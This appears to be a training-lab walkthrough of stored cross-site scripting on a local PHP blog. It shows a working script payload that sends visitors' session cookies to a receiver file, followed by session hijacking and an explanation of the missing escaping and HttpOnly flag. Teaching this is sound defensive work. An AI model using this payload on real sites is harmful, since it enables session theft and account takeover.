# Advanced XSS: Cookie Stealing Lab

In this scenario, we will demonstrate how an attacker can steal a victim's session cookies and store them on a remote server.

## 1. Setup the Attacker's "Receiver"
The attacker needs a script to receive the stolen cookies. I have created `steal.php` for this purpose.

*   **Receiver Script:** `steal.php`
*   **Log File:** `cookies.txt` (This is where the stolen cookies will appear).

**Important:** Ensure the web server has permission to write to `cookies.txt`:
```bash
touch cookies.txt
chmod 777 cookies.txt
```

---

## 2. The Attacker: Injecting the Malicious Script
The attacker will create a new blog post containing a script that sends the viewer's cookies to the attacker's server.

1.  Login as `admin` (or any user).
2.  Go to **New Post** (`create.php`).
3.  In the **Content** field, paste the following payload:

```html
<script>
    new Image().src = "http://localhost/SQLMAP_Lab/steal.php?c=" + document.cookie;
</script>
<p>Nothing to see here, just a normal blog post!</p>
```

4.  Click **Publish Post**.

---

## 3. The Victim: Triggering the Attack
Now, simulate a victim visiting the website.

1.  Open a **different browser** or an **Incognito/Private window**.
2.  Go to `http://localhost/SQLMAP_Lab/login.php` and login (if you have other users, otherwise use the admin account).
3.  Go to the **Home Page** (`index.php`).
4.  As soon as the home page loads, the victim's browser executes the hidden script. It silently sends the victim's session cookie to `steal.php`.

---

## 4. The Attacker: Harvesting the Cookies
The attacker can now check the `cookies.txt` file to see the stolen data.

*   Open `cookies.txt` in your editor or via terminal:
```bash
cat cookies.txt
```

**What you will see:**
You will see an entry containing `PHPSESSID=...`. An attacker can use this ID to "hijack" the victim's session by manually setting their own `PHPSESSID` cookie to this value.

---

## 5. Why this works
*   **Stored XSS:** The malicious script is saved in the database.
*   **Lack of Sanitization:** `index.php` displays the post content using `nl2br()` without using `htmlspecialchars()`, which allows `<script>` tags to run.
*   **No Cookie Security:** The cookies are not set with the `HttpOnly` flag. If `HttpOnly` was enabled, JavaScript (`document.cookie`) would not be able to read them.
